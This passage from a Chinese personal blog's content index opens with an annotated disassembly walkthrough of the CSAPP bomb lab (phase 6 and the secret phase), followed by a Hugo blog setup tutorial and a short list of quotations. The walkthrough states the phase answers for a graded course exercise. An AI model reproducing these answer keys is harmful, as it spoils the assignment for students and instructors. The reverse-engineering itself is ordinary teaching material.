//跳转到0x401114 #这段代码的目的就是让所有参数要小于等于6，并且不得重复 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi //rsi=rsp+24 401158:\t4c 89 f0 mov %r14,%rax //rax=r14 rsp 40115b:\tb9 07 00 00 00 mov $0x7,%ecx //ecx=7 401160:\t89 ca mov %ecx,%edx //edx=ecx=7 401162:\t2b 10 sub (%rax),%edx //edx=edx-*(rax) 7-*(rsp) 401164:\t89 10 mov %edx,(%rax) //*(rax)=edx *(rsp)=7-*(rsp) 401166:\t48 83 c0 04 add $0x4,%rax //rax=rax+4 rsp+4 40116a:\t48 39 f0 cmp %rsi,%rax //rax与rsi比较 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; //若rax!=rsi，则跳转到0x401160 六次循环 #这段代码就是处理参数 #相当于for(int i=0;i\u0026lt;6;i++){ #input[i]=7-input[i]; #} 40116f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; //跳转到0x401197 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx //rdx=*(rdx+8) *(0x6032d0+8) 40117a:\t83 c0 01 add $0x1,%eax //eax++ 2 40117d:\t39 c8 cmp %ecx,%eax //比较ecx和eax的大小 *(rsp)与2大小 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; //若ecx!=eax，则跳转到0x401176 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; //跳转到0x401188 401183:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) //*(rsp+rsi*2+32)=rdx 40118d:\t48 83 c6 04 add $0x4,%rsi //rsi=rsi+4 4 401191:\t48 83 fe 18 cmp $0x18,%rsi //rsi与24比较 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; //若rsi=24，跳转到0x4011ab 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx //ecx=*(rsp+rsi) 指针偏移，依次获取6个数 *(rsp) *(rsp+4) 40119a:\t83 f9 01 cmp $0x1,%ecx //比较ecx与1的大小 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; //若ecx\u0026lt;=1，跳转到0x401183 即当处理后的*(rsp)=1时 40119f:\tb8 01 00 00 00 mov $0x1,%eax //eax=1 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; //跳转到0x401176 #这段代码不太好着手，根据我们输入的1 2 3 4 5 6带入运行，经过之前的处理后编程了6 5 4 3 2 1， #这段代码的关键在于0x6032d0这个地址代表的含义， #在处理第一个参数6时，发现在不断嵌套使用地址，优点像链表，利用gdb查看，这个地址的值发现： #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 #在这里，我的输入是1 2 3 4 5 6 #我们看到打印出来的结果，每个node里第2个四字节的部分和我们的输入吻合； #而第三个四字节的部分则是下一个node的起始地址，最后一个四字节的部分则为0， #考虑到内存对齐，我们大概能推测出，这应该是一个链表，而我们的输入的数字与在第二个四字节的地方的数据有关， #第一个四字节的内容表示的是什么待确定 # 这个结构体有点类似链表： # struct { # int sth; // 某四字节内容 # int input; // 与我们的输入有关 # node* next; // 下一个node地址 # } node; #这么看下来这段代码就是将处理后参数所对应node的起始地址存储到首地址为rsp+0x20，尾地址为rsp+0x50的地方 #(gdb) x/12w $rsp+0x20 #0x7fffffffd8c0: 0x00603320 0x00000000 0x00603310 0x00000000 #0x7fffffffd8d0: 0x00603300 0x00000000 0x006032f0 0x00000000 #0x7fffffffd8e0: 0x006032e0 0x00000000 0x006032d0 0x00000000 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx //rbx=*(rsp+0x20) 0x00603320 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax //rax=(rsp+0x28) 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi //rsi=(rsp+0x50) 4011ba:\t48 89 d9 mov %rbx,%rcx //rcx=rbx=*(rsp+0x20) 0x00603320 4011bd:\t48 8b 10 mov (%rax),%rdx //rdx=*(rax)=*(rsp+0x28) 0x00603310 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) //*(rcx+8)=rdx *(*(rsp+0x20)+8)=*(rsp+0x28) //*0x00603328=0x00603310 *0x00603318=0x603300 4011c4:\t48 83 c0 08 add $0x8,%rax //rax+=8 (rsp+0x30) 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; //若rax=rsi,跳转到0x4011d2 4011cd:\t48 89 d1 mov %rdx,%rcx //rcx=rdx *(rsp+0x28) 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; //跳转到0x4011bd #这段代码可以简化为一个for循环，这个循环用来将链表的结点重新调整至第一个参数的结点为头节点， #后面的参数依次链接在这个头结点后的链表： #for(int i=0;i\u0026lt;6;i++){ #node[i]-\u0026gt;next=node[i+1]; #} #结果如下 #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032d0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x006032e0 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x006032f0 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603300 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00603310 0x00000000 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) ///*(rdx+8)=0 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp //ebp=5 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax //rax=*(rbx+8)=头结点的下一个结点rbx=*(rsp+0x20) 4011e3:\t8b 00 mov (%rax),%eax //eax=*(rax) 下一结点的sth内容 4011e5:\t39 03 cmp %eax,(%rbx) //当前结点的sth与下一结点的sth内容比较 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; //若*(rbx)\u0026gt;=eax，则跳转到0x4011ee 4011e9:\te8 4c 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx //rbx=*(rbx+8) 指向下一个结点 4011f2:\t83 ed 01 sub $0x1,%ebp //ebp-- 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; //若不等于0，则跳转到0x4011df 4011f7:\t48 83 c4 50 add $0x50,%rsp //出栈，栈指针增加80 #这段代码主要是比较每个结点和下一个结点的sth值(结点的首四字节内容)，当前结点的sth要大于等于下一结点的sth， #所以我们需要将sth的值排序从大到小排序,排序后所结点对应序号的序列就是我们要输入的参数值和对应顺序， #即4 3 2 1 6 5 注意参数被处理过，不要写成3 4 5 6 1 2 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret 注释中一般都只写了第一次循环各寄存器所对应的值，若有多个值则是循环了多次，一般循环两三次就能看出整个函数的用意。整个phase_6调试所输入的参数为1 2 3 4 5 6\nBonus 00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi #地址的值是\u0026#34;%d %d %s\u0026#34; 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi #地址的值是\u0026#34;7 0\u0026#34;这正是第4关的key，推测从这关进入彩蛋 4015fa:\te8 f1 f5 ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #eax!=3，就跳转到末尾 401604:\tbe 22 26 40 00 mov $0x402622,%esi #esi=0x402622 该地址对应\u0026#34;DrEvil\u0026#34; 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi #rdi=*(rsp+16) 40160e:\te8 25 fd ff ff call 401338 \u0026lt;strings_not_equal\u0026gt; #判断字符串是否相等 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #如果不等，就跳转到末尾 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff call 401242 \u0026lt;secret_phase\u0026gt; #因此进入彩蛋需要在第4关的答案后面添上\u0026#34;DrEvil\u0026#34;字符串 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; #若rdi=0，则跳转 40120d:\t8b 17 mov (%rdi),%edx #edx=*(rdi)=0x24 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; #若edx\u0026lt;=esi，则跳转 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi #rdi=*(rdi+8) 401217:\te8 e8 ff ff ff call 401204 \u0026lt;fun7\u0026gt; func7(0x00603110,input) 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax #eax=0 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; #若edx=esi，则跳转 input不能等于0x24 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi #rdi=*(rdi+16) 40122d:\te8 d2 ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax #eax=rax+rax+1 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; #跳转 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret #等价c语言： int fun7(int input, Node* addr){ if(addr == 0){ return -1; } int v = addr-\u0026gt;value; if (v == input){ return 0; }else if( v \u0026lt; input){ return 1 + 2*fun7(input, addr-\u0026gt;right); }else{ return 2*func7(input, addr-\u0026gt;left); } } #纵观eax值的设置，一共有三处，esi\u0026lt;edx时，eax=2*eax； esi=edx时，eax=0；esi\u0026gt;edx时，eax=rax+rax+1，在它们的前面还会嵌套调用func7 #若想让eax=2，那么只有让最深层的func7调用eax=0，然后调用eax=rax+rax+1，最后最外面这层func7函数调用eax=2*eax，这样刚好等于2 #所以input\u0026lt;0x24 input\u0026gt;0x8 input=0x16 #这里的设置与phase_6的设置有些类似，涉及到了地址嵌套调用，使用gdb查看相应的内存地址范围的值，一目了然。 #(gdb) x/120w 0x6030f0 #0x6030f0 \u0026lt;n1\u0026gt;: 0x00000024 0x00000000 0x00603110 0x00000000 #0x603100 \u0026lt;n1+16\u0026gt;: 0x00603130 0x00000000 0x00000000 0x00000000 #0x603110 \u0026lt;n21\u0026gt;: 0x00000008 0x00000000 0x00603190 0x00000000 #0x603120 \u0026lt;n21+16\u0026gt;: 0x00603150 0x00000000 0x00000000 0x00000000 #0x603130 \u0026lt;n22\u0026gt;: 0x00000032 0x00000000 0x00603170 0x00000000 #0x603140 \u0026lt;n22+16\u0026gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 #0x603150 \u0026lt;n32\u0026gt;: 0x00000016 0x00000000 0x00603270 0x00000000 #0x603160 \u0026lt;n32+16\u0026gt;: 0x00603230 0x00000000 0x00000000 0x00000000 #0x603170 \u0026lt;n33\u0026gt;: 0x0000002d 0x00000000 0x006031d0 0x00000000 #0x603180 \u0026lt;n33+16\u0026gt;: 0x00603290 0x00000000 0x00000000 0x00000000 #0x603190 \u0026lt;n31\u0026gt;: 0x00000006 0x00000000 0x006031f0 0x00000000 #0x6031a0 \u0026lt;n31+16\u0026gt;: 0x00603250 0x00000000 0x00000000 0x00000000 #0x6031b0 \u0026lt;n34\u0026gt;: 0x0000006b 0x00000000 0x00603210 0x00000000 #0x6031c0 \u0026lt;n34+16\u0026gt;: 0x006032b0 0x00000000 0x00000000 0x00000000 #0x6031d0 \u0026lt;n45\u0026gt;: 0x00000028 0x00000000 0x00000000 0x00000000 #0x6031e0 \u0026lt;n45+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6031f0 \u0026lt;n41\u0026gt;: 0x00000001 0x00000000 0x00000000 0x00000000 #0x603200 \u0026lt;n41+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603210 \u0026lt;n47\u0026gt;: 0x00000063 0x00000000 0x00000000 0x00000000 #0x603220 \u0026lt;n47+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603230 \u0026lt;n44\u0026gt;: 0x00000023 0x00000000 0x00000000 0x00000000 #0x603240 \u0026lt;n44+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603250 \u0026lt;n42\u0026gt;: 0x00000007 0x00000000 0x00000000 0x00000000 #0x603260 \u0026lt;n42+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603270 \u0026lt;n43\u0026gt;: 0x00000014 0x00000000 0x00000000 0x00000000 #0x603280 \u0026lt;n43+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603290 \u0026lt;n46\u0026gt;: 0x0000002f 0x00000000 0x00000000 0x00000000 #0x6032a0 \u0026lt;n46+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6032b0 \u0026lt;n48\u0026gt;: 0x000003e9 0x00000000 0x00000000 0x00000000 #0x6032c0 \u0026lt;n48+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx #edx=10 第三个参数 40124d:\tbe 00 00 00 00 mov $0x0,%esi #esi=0 第二个参数 401252:\t48 89 c7 mov %rax,%rdi #rdi=rax 第一个参数 401255:\te8 76 f9 ff ff call 400bd0 \u0026lt;strtol@plt\u0026gt; #将字符串转为长整型 40125a:\t48 89 c3 mov %rax,%rbx #rbx=rax 40125d:\t8d 40 ff lea -0x1(%rax),%eax #eax=rax-1 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #eax与1000比较 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; #若eax\u0026lt;=1000,则跳转到0x40126c 401267:\te8 ce 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 40126c:\t89 de mov %ebx,%esi #esi=ebx 第二个参数为转化后的长整型数字 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi #edi=0x6930f0 第一个参数 401273:\te8 8c ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax #比较eax和2 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt; #若eax=2，跳转到0x401282,所以func7函数返回值必须要等于2 40127d:\te8 b8 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #否则，爆炸 401282:\tbf 38 24 40 00 mov $0x402438,%edi #edi=0x402438 401287:\te8 84 f8 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 call 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 注意：彩蛋要在输入6个关卡的答案后才会出现。\n","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu16866174452783611002.jpg","permalink":"https://chenyuan1125.github.io/en/p/csappbomb%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bomb实验"},{"content":"Hugo介绍 Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\nHugo中文文档地址： https://www.gohugo.org\nHugo安装 下载地址：https://github.com/gohugoio/hugo/releases\n找到对应系统的下载文件(win10为例，建议选择extended版本，有些主题需要extended版本才能正常使用)\n建立blog文件夹，并将下载好的zip文件解压到该文件夹下(建议不要有中文和空格)\n再将hogu.exe的路径添加到环境变量中(不会则请STFW)\n在cmd中查看命令是否成功\n输入下面命令查看是否成功 $ hugo version 输出结果： Hugo Static Site Generator v0.68.3/extended windows/amd64 BuildDate: unknown 说明安装成功 设置站点\nhugo new site myBlog 生成myblog文件夹\nHugo主题下载 官方网址：https://www.gohugo.org/theme/\n建议安装方法：\n将下载好的主题解压放入之前new出来的文件夹(我这里是myblog)文件夹下的themes下\n并在myblog/config.toml里加一行 theme=xxxx（解压后的主题文件夹的名称）\n把主题中的config.yaml或toml文件复制放到myblog文件夹下\n启动站点\nhugo server 请注意倒数第二行（ Web Server is available at //localhost:1313/ (bind address 127.0.0.1) ）说明启动成功了\nBuilding sites … WARN 2020/04/07 17:51:51 Markup type mmark is deprecated and will be removed in a future release. See https://gohugo.io//content-management/formats/#list-of-content-formats | EN -------------------+----- Pages | 74 Paginator pages | 0 Non-page files | 21 Static files | 8 Processed images | 28 Aliases | 14 Sitemaps | 1 Cleaned | 0 Built in 1103 ms Watching for changes in F:\\blog\\myBlog\\{archetypes,content,data,layouts,static,themes} Watching for config changes in F:\\blog\\myBlog\\config.toml, F:\\blog\\myBlog\\config\\_default Environment: \u0026#34;development\u0026#34; Serving pages from memory Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at //localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 在浏览器中输入 localhost:1313，就可以看到效果了\n注意事项：如果启动站点失败，可以先将主题删除，再启动站点，看是否报错，若没报错则是主题配置问题。\n创建文章 创建第一篇文章，放到 post 目录，方便之后生成聚合页面。(注意命名时不可以空格，可以用-代替)\nhugo post/first.md 然后就可以使用 hugo server 来查看效果啦！\n(注意：如果没出现新文章，则可能开启了draft模式，使用hogu server -D)\n部署到服务器 我们将使用github.io来代替服务器以及域名：推荐参考教程\n几个注意事项：\nGit要上传或执行的文件可以在文件夹中，右键空白地区点git bash here从而实现目录内操作。 在linux操作中（比如git）粘贴操作是shift+insert或单击鼠标的滚轮。而复制只要选中即可。 github的域名地址与用户名必须一致，比如你的github名字叫sakura，那么域名必须是sakura.github.io。 hugo命令 hugo --baseUrl=\u0026quot;https://你的github名字.github.io/\u0026quot;执行完后，会生成一个public文件夹。 用git推送的时候 git pull --rebase origin master语句可能会出错显示没有文件，不用担心，这是因为此时目标仓库是空的，直接下一步最后，你只需要输入对应网址，即可看到博客了！ 如果想将默认语言设置为中文，只要在config中设置一下defaultContentLanguage=\u0026ldquo;zh-cn\u0026quot;就行了，但可能会不生效，最好将其放在config.toml的第一行 更新博客 在博客目录下使用 hugo \u0026ndash;baseURL=\u0026ldquo;https://你的github名字.github.io/\u0026ldquo;覆盖原来的public文件夹\n进入public文件夹右键git bash 分别执行\ngit add . git commit -m ‘first commit’ git push origin master 可能存在的问题：\ngithub上存放文件的仓库是否只有一个分支（创建时不要勾选生成README.md) 正常public上传github仓库后会只有一个分支，且包含了public内的所有文件 文章看不到,检查是否格式正确，使用了hugo new xxxx.md,检查是否包含了 draft: true，若有则删除或使用 hugo server -D，若草稿模式开启是看不到文章的 git push不成功,此时大概率是网络通信有问题，可以关掉git终端后科学上网；重启git 终端后（windows需要，linux系统不需要）再进行push大概率就可以解决问题了；此时无需再进行git init 等初始化操作因为之前已经做完。 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/1_hu13415945946882854451.jpg","permalink":"https://chenyuan1125.github.io/en/p/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","title":"个人博客搭建"},{"content":"随想录 一些很好的话 世界上没有直路，要准备走曲折的路。 只要我不放弃的话缘分就会一直下去。 躺平有时，奋斗又是，发疯有时，理性有时，但最终我们依然向往的是一种正向的东西，而不是一种虚伪的东西。 ","date":"2023-03-09T00:00:00Z","image":"https://chenyuan1125.github.io/en/p/%E9%9A%8F%E6%83%B3%E5%BD%95/1_hu17545487328256898304.jpg","permalink":"https://chenyuan1125.github.io/en/p/%E9%9A%8F%E6%83%B3%E5%BD%95/","title":"随想录"}]